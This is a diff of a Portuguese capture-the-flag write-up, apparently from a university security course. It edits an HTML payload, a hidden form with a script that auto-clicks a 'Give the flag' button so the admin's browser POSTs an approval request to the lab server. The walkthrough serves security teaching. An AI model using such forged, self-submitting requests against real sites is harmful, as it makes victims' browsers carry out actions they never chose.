@@ -10,17 +10,18 @@ Onde é possível ver que a página do admin muda para a porta 5005 em vez da 50
 ![ctf6imagem2](images/ctf6imagem2.png)
 
 ```html
- <form method="POST" action="/request/877361c8b921df188014a0e8790347ffe5cbeb78/approve" role="form">
+<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/fd6edcc0bf22cea333f4b2dd95c9ba7a429d463e/approve" role="form" hidden>
     <div class="submit">
-        
-        <input type="submit" id="giveflag" value="Give the flag" disabled="">
-        
+        <input type="submit" id="giveflag" value="Give the flag">
     </div>
-</form> 
+    <script>
+        document.getElementById('giveflag').click();
+    </script>
+</form>
 ```
 
 
-Onde "877361c8b921df188014a0e8790347ffe5cbeb78" é o request id que nos é dado na página inicial. Logo, podemos adaptar um novo form com o objetivo de aceitar o pedido. 
+Onde "fd6edcc0bf22cea333f4b2dd95c9ba7a429d463e" é o request id que nos é dado na página inicial. Logo, podemos adaptar um novo form com o objetivo de aceitar o pedido. 
 
 ``` html
 <form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/<request_id>/approve" role="form" hidden>
